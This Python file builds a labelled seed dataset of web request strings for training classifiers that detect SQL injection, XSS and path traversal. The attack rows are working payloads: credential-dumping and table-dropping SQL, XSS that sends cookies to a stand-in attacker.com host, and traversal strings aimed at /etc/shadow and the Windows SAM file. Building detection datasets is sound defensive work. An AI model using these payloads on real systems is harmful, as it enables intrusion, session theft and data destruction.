"""
Gold Seed Set Generator (`src/data/create_gold_seeds.py`)

Generates a 100% verified Gold Seed Set (128 canonical rows: 32 per class for benign, sqli, xss, pathtrav)
used for fine-tuning SetFit semantic classifiers.
"""

import os
import pandas as pd

GOLD_SEEDS = [
    # ----------------------------------------------------
    # BENIGN PAYLOADS (32 canonical benign web parameters)
    # ----------------------------------------------------
    ("index.php?page=home&user_id=123", "benign"),
    ("search.php?q=laptop+bags+sale", "benign"),
    ("login.php?action=auth&username=john_doe", "benign"),
    ("category.php?cat=electronics&sort=price_asc", "benign"),
    ("profile.php?user=alice123&lang=en_US", "benign"),
    ("cart.php?action=add_item&item_id=9872", "benign"),
    ("checkout.php?step=shipping&address_id=45", "benign"),
    ("contact.php?subject=support_request&email=user@example.com", "benign"),
    ("blog.php?post_id=4021&page=2", "benign"),
    ("download.php?file=report_2025.pdf", "benign"),
    ("view.php?doc=user_guide.html&version=1.2", "benign"),
    ("api/v1/status?service=database", "benign"),
    ("settings.php?theme=dark_mode&notifications=1", "benign"),
    ("forum.php?thread_id=58291&page=3", "benign"),
    ("gallery.php?album=vacation2025&photo=img_04.jpg", "benign"),
    ("news.php?year=2025&month=08", "benign"),
    ("order_history.php?order_id=ORD-998231", "benign"),
    ("feedback.php?rating=5&comment=great_service", "benign"),
    ("search?q=weather+forecast+tomorrow", "benign"),
    ("help/faq?category=account_billing", "benign"),
    ("user/avatar/upload?format=png", "benign"),
    ("products/detail?sku=SKU-10294-BLK", "benign"),
    ("index.php?option=com_content&view=article&id=42", "benign"),
    ("main.php?section=about_us", "benign"),
    ("auth/login?redirect=/dashboard", "benign"),
    ("dashboard/analytics?range=last_7_days", "benign"),
    ("notifications/read_all?user=1049", "benign"),
    ("tickets/view?ticket_id=TK-44019", "benign"),
    ("subscribers/add?email=test@domain.com", "benign"),
    ("catalog/list?filter=brand_nike", "benign"),
    ("api/users/profile?id=8831", "benign"),
    ("index.php?lang=fr&ref=newsletter", "benign"),

    # ----------------------------------------------------
    # SQL INJECTION PAYLOADS (32 canonical SQLi payloads)
    # ----------------------------------------------------
    ("1' UNION SELECT username, password FROM users--", "sqli"),
    ("' OR 1=1--", "sqli"),
    ("admin' --", "sqli"),
    ("1; DROP TABLE users;--", "sqli"),
    ("1' AND SLEEP(5)--", "sqli"),
    ("1 UNION ALL SELECT NULL, NULL, version()--", "sqli"),
    ("1' AND BENCHMARK(5000000,MD5(1))--", "sqli"),
    ("1' OR '1'='1", "sqli"),
    ("1'; EXEC xp_cmdshell('dir');--", "sqli"),
    ("1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--", "sqli"),
    ("1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--", "sqli"),
    ("1' OR 1=1 #", "sqli"),
    ("' HAVING 1=1--", "sqli"),
    ("1' GROUP BY username HAVING 1=1--", "sqli"),
    ("1' ORDER BY 10--", "sqli"),
    ("1 UNION SELECT 0x61646d696e, 0x313233--", "sqli"),
    ("1' WHERE 1=1 AND 2=2--", "sqli"),
    ("' OR 'a'='a", "sqli"),
    ("1' AND extractvalue(1, concat(0x7e, (select version())))--", "sqli"),
    ("1' AND updatexml(1, concat(0x7e, (select user())), 1)--", "sqli"),
    ("1' UNION SELECT NULL, table_name FROM information_schema.tables--", "sqli"),
    ("1' OR 1=1 LIMIT 1--", "sqli"),
    ("1' AND 1=2 UNION SELECT 1, 2, 3--", "sqli"),
    ("1' OR EXISTS(SELECT * FROM users)--", "sqli"),
    ("1'; INSERT INTO users (username, password) VALUES ('hacker', 'pass');--", "sqli"),
    ("1'; UPDATE users SET role='admin' WHERE id=1;--", "sqli"),
    ("1' AND substring(version(),1,1)='5'--", "sqli"),
    ("1' AND ascii(substring((SELECT password FROM users LIMIT 1),1,1))>50--", "sqli"),
    ("1 UNION SELECT schema_name FROM information_schema.schemata--", "sqli"),
    ("1' WAITFOR DELAY '0:0:5'--", "sqli"),
    ("1' OR NOT 1=2--", "sqli"),
    ("1' UNION SELECT load_file('/etc/passwd')--", "sqli"),

    # ----------------------------------------------------
    # XSS PAYLOADS (32 canonical XSS payloads)
    # ----------------------------------------------------
    ("<script>alert('XSS')</script>", "xss"),
    ("<img src=x onerror=alert(1)>", "xss"),
    ("<svg/onload=alert('XSS')>", "xss"),
    ("<iframe src=\"javascript:alert('XSS')\">", "xss"),
    ("<body onload=alert(document.cookie)>", "xss"),
    ("<script src=\"http://attacker.com/xss.js\"></script>", "xss"),
    ("<a href=\"javascript:alert(1)\">Click me</a>", "xss"),
    ("<input type=\"text\" value=\"\" onfocus=\"alert(1)\">", "xss"),
    ("<details open ontoggle=alert(1)>", "xss"),
    ("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "xss"),
    ("<img src=\"1\" onmouseover=\"alert(document.domain)\">", "xss"),
    ("<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>", "xss"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "xss"),
    ("<marquee onstart=alert(1)>", "xss"),
    ("<object data=\"javascript:alert(1)\">", "xss"),
    ("<embed src=\"javascript:alert(1)\">", "xss"),
    ("<math><a xlink:href=\"javascript:alert(1)\">click", "xss"),
    ("<form><button formaction=\"javascript:alert(1)\">XSS", "xss"),
    ("<textarea onfocus=alert(1) autofocus>", "xss"),
    ("<keygen autofocus onfocus=alert(1)>", "xss"),
    ("<select autofocus onfocus=alert(1)>", "xss"),
    ("<video><source onerror=\"javascript:alert(1)\">", "xss"),
    ("<audio src=x onerror=alert(1)>", "xss"),
    ("<script>fetch('http://attacker.com/log?cookie='+document.cookie)</script>", "xss"),
    ("<div style=\"width: expression(alert(1));\">", "xss"),
    ("<img src=x onerror=prompt(1)>", "xss"),
    ("<script>confirm(1)</script>", "xss"),
    ("javascript:alert(document.cookie)", "xss"),
    ("<script>window.location.href='http://attacker.com'</script>", "xss"),
    ("<isindex type=image action=javascript:alert(1)>", "xss"),
    ("<link rel=import href=\"http://attacker.com/xss.html\">", "xss"),
    ("<base href=\"javascript:alert(1)//\">", "xss"),

    # ----------------------------------------------------
    # PATH TRAVERSAL PAYLOADS (32 canonical PathTrav payloads)
    # ----------------------------------------------------
    ("../../../../etc/passwd", "pathtrav"),
    ("..\\..\\..\\..\\windows\\win.ini", "pathtrav"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "pathtrav"),
    ("%252e%252e%252fetc%252fpasswd", "pathtrav"),
    ("/etc/passwd", "pathtrav"),
    ("c:\\windows\\win.ini", "pathtrav"),
    ("../../../../../etc/shadow", "pathtrav"),
    ("..\\..\\..\\..\\boot.ini", "pathtrav"),
    ("../../../../../etc/group", "pathtrav"),
    ("../../../../../etc/hosts", "pathtrav"),
    ("../../../../../var/log/apache2/access.log", "pathtrav"),
    ("....//....//....//etc/passwd", "pathtrav"),
    ("..%2f..%2f..%2fetc%2fpasswd", "pathtrav"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "pathtrav"),
    ("/proc/self/environ", "pathtrav"),
    ("/proc/self/cmdline", "pathtrav"),
    ("/var/log/auth.log", "pathtrav"),
    ("../../../../../etc/issue", "pathtrav"),
    ("..%252f..%252f..%252fetc%252fpasswd", "pathtrav"),
    ("c:\\boot.ini", "pathtrav"),
    ("c:\\windows\\system32\\drivers\\etc\\hosts", "pathtrav"),
    ("../../../../../windows/system32/cmd.exe", "pathtrav"),
    ("..\\..\\..\\..\\windows\\system32\\config\\sam", "pathtrav"),
    ("../../../../../etc/resolv.conf", "pathtrav"),
    ("../../../../../etc/hostname", "pathtrav"),
    ("/etc/nginx/nginx.conf", "pathtrav"),
    ("/etc/httpd/conf/httpd.conf", "pathtrav"),
    ("..%00/etc/passwd", "pathtrav"),
    ("../../../../etc/passwd%00", "pathtrav"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "pathtrav"),
    ("..%c1%9c..%c1%9c..%c1%9cwindows/win.ini", "pathtrav"),
    ("/WEB-INF/web.xml", "pathtrav")
]


def get_gold_seed_df():
    df = pd.DataFrame(GOLD_SEEDS, columns=["sanitized_payload", "label_multiclass"])
    df["label_binary"] = (df["label_multiclass"] != "benign").astype(int)
    return df


if __name__ == "__main__":
    df = get_gold_seed_df()
    print(f"Generated Gold Seed Set: {len(df)} canonical rows")
    print(df["label_multiclass"].value_counts())
